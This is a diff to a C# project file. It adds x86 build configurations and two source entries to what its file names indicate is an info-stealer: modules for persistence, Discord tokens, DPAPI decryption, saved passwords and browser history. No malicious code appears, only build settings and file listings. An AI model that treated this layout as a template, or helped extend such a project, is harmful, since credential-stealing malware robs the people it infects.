@@ -52,6 +52,26 @@
     <ErrorReport>prompt</ErrorReport>
     <Prefer32Bit>true</Prefer32Bit>
   </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x86'">
+    <DebugSymbols>true</DebugSymbols>
+    <OutputPath>bin\x86\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <DebugType>full</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x86'">
+    <OutputPath>bin\x86\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <Optimize>true</Optimize>
+    <DebugType>pdbonly</DebugType>
+    <PlatformTarget>x86</PlatformTarget>
+    <LangVersion>7.3</LangVersion>
+    <ErrorReport>prompt</ErrorReport>
+    <Prefer32Bit>true</Prefer32Bit>
+  </PropertyGroup>
   <ItemGroup>
     <Reference Include="Sodium">
       <HintPath>C:\Users\Andrey\Downloads\Sodium.dll</HintPath>
@@ -75,6 +95,7 @@
   <ItemGroup>
     <Compile Include="persistence.cs" />
     <Compile Include="SimpleJSON.cs" />
+    <Compile Include="SQLiteHandler.cs" />
     <Compile Include="stealer\AutoStealer.cs" />
     <Compile Include="config.cs" />
     <Compile Include="core.cs" />
@@ -82,6 +103,7 @@
     <Compile Include="stealer\Crypt.cs" />
     <Compile Include="stealer\Discord.cs" />
     <Compile Include="stealer\DPAPI.cs" />
+    <Compile Include="stealer\Format.cs" />
     <Compile Include="stealer\History.cs" />
     <Compile Include="stealer\Passwords.cs" />
     <Compile Include="Program.cs" />
